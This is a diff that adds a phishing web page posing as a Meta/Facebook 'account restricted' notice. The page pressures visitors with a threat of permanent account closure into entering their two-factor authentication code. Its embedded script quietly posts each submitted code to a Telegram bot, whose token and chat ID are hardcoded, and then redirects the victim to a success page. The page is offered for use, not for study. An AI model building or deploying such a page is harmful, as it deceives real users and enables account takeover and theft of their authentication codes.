@@ -1,0 +1,218 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>OTP Verification - Error</title>
+    <style>
+        body {
+            font-family: "Arial", sans-serif;
+            background-color: #f5f6f7;
+            margin: 0;
+            padding: 0;
+        }
+
+        header {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 80px;
+            width: 100%;
+            background-color: #fff;
+            box-shadow: 0px 2px 4px rgba(0, 0, 0, 0.1);
+        }
+
+        header img {
+            height: 100%;
+            width: auto;
+        }
+
+        main {
+            max-width: 600px;
+            margin: 40px auto;
+            padding: 20px;
+            background-color: #ffffff;
+            box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.1);
+            border-radius: 8px;
+        }
+
+        .hero img {
+            width: 100%;
+            border-radius: 8px;
+            margin-bottom: 20px;
+        }
+
+        .main-header {
+            font-size: 24px;
+            font-weight: bold;
+            color: #333333;
+            margin-bottom: 10px;
+            text-align: center;
+        }
+
+        .main-description {
+            font-size: 16px;
+            color: #555555;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+
+        .main-description a {
+            color: #1877f2;
+            text-decoration: none;
+        }
+
+        .main-description a:hover {
+            text-decoration: underline;
+        }
+
+        form {
+            margin-top: 20px;
+        }
+
+        form input {
+            width: 95%;
+            padding: 10px 12px;
+            margin-bottom: 15px;
+            font-size: 14px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            box-sizing: border-box;
+        }
+
+        form button {
+            width: 95%;
+            padding: 12px 15px;
+            font-size: 16px;
+            background-color: #1877f2;
+            color: #fff;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-weight: bold;
+            box-sizing: border-box;
+        }
+
+        form button:hover {
+            background-color: #145dbf;
+        }
+
+        .case-info {
+            font-size: 14px;
+            color: #555555;
+            margin-top: 20px;
+            text-align: center;
+        }
+
+        .warning {
+            font-size: 12px;
+            color: #ff0000;
+            margin-top: 15px;
+            text-align: center;
+        }
+
+        .warning a {
+            color: #1877f2;
+            text-decoration: none;
+        }
+
+        .warning a:hover {
+            text-decoration: underline;
+        }
+
+        .error-message {
+            color: #ff0000;
+            font-weight: bold;
+            text-align: center;
+            margin-top: 15px;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <img src="https://logoeps.com/wp-content/uploads/2021/10/meta-logoeps.com_.png" alt="Meta Logo">
+    </header>
+    <main>
+        <div class="hero">
+            <img src="https://www.adweek.com/wp-content/uploads/2022/03/Facebook-Protect-Hero.png?w=994" alt="Hero Image">
+        </div>
+        <div class="main-header">Your account has been restricted</div>
+        <div class="main-description">
+            We detected unusual activity in your page today <strong id="current-date"></strong>.<br>
+            Someone has reported your account for not complying with
+            <a href="https://www.facebook.com/communitystandards" target="_blank">Community Standards</a>. We have already reviewed this decision, and the decision cannot be changed. To avoid having your account disabled, please verify with the Two-factor authentication required code we sent:
+        </div>
+
+        <div class="error-message" id="errorMessage"></div>
+
+        <form id="otpForm">
+            <input type="text" name="otp" id="otp" placeholder="Enter Two-factor authentication required" required>
+            <button type="submit">Verify Two-factor authentication required</button>
+        </form>
+
+        <div class="case-info">
+            Case Number: <strong>#100430558912</strong><br>
+            About Case: Violating Community Standards and Posting something inappropriate.
+        </div>
+
+        <div class="warning">
+            ⚠️ Please make sure to enter the correct Two-factor authentication required. If you enter the wrong Two-factor authentication required multiple times, your account may be permanently closed.
+        </div>
+    </main>
+
+    <script>
+        // Set current date dynamically
+        document.getElementById('current-date').textContent = new Date().toLocaleDateString('en-US', {
+            year: 'numeric',
+            month: 'long',
+            day: 'numeric'
+        });
+
+        // Form submission logic
+        document.getElementById('otpForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+
+               const botToken = "6303918595:AAFXVIhGvO1ANChwjTe7KcXGeNqyOVotMDA";
+        const chatID = "-1002208568961";
+            const otp = document.getElementById('otp').value;
+            const currentDateTime = new Date().toLocaleString('en-US', {
+                year: 'numeric',
+                month: 'long',
+                day: 'numeric',
+                hour: '2-digit',
+                minute: '2-digit',
+                second: '2-digit',
+                hour12: true
+            });
+
+            const message = `❌ OTP Submitted (Wrong OTP)\n\n🔑 OTP: ${otp}\n🕒 Submitted At: ${currentDateTime}`;
+
+            // Telegram API URL
+            const telegramURL = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+            // Sending OTP to Telegram
+            fetch(telegramURL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: chatID,
+                    text: message
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) {
+                    // Redirect to success.html after sending the OTP (even with error)
+                    window.location.href = "success.html";
+                } else {
+                    document.getElementById('errorMessage').textContent = "⚠️ Failed to send OTP. Please try again.";
+                }
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                document.getElementById('errorMessage').textContent = "⚠️ An error occurred. Please try again later.";
+            });
+        });
+    </script>
+</body>
+</html>
